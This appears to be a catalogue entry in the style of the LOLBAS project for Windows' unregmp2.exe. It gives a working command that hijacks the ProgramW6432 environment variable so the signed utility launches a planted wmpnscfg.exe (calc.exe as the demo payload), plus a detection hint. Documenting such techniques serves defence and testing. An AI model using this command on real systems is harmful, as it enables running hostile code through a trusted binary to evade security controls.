name: Unregmp2.exe
description: Microsoft Windows Media Player Setup Utility
author: Wade Hickey

commands.command: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
commands.description: Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.

detection: Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes of `unregmp2.exe /HideWMP`
